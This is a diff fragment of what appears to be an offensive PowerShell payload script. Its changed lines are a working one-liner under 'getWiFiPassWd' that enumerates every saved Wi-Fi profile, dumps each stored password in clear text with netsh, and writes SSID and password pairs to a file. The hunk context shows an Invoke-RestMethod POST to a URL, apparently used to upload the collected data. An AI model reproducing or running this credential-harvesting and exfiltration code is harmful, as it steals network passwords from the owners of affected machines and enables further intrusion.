@@ -21,7 +21,8 @@ Invoke-RestMethod -Uri $Url -Method Post -ContentType "multipart/form-data; boun
 
 
 ## getWiFiPassWd
-$ws=(netsh wlan show profiles) -match " : ";foreach($s in $ws){echo $s;$ssid=$s.Split(":")[1].Trim();$pw=(netsh wlan show profiles name=$ssid key=clear);$c=0;foreach($p in $pw){;if($c -eq "32"){$pass=$p.Split(":")[1].Trim();}$c+=1}echo "$ssid $pass" >> $FilePath}
+$ws=(netsh wlan show profiles) -match " : ";foreach($s in $ws){$ssid=$s.Split(":")[1].Trim();$pw=(netsh wlan show profiles name=$ssid key=clear);
+$c=0;foreach($p in $pw){;if($c -eq "32"){$pass=$p.Split(":")[1].Trim();}$c+=1}echo "$ssid $pass" >> $FilePath}
 
 ## downloadFiles
 
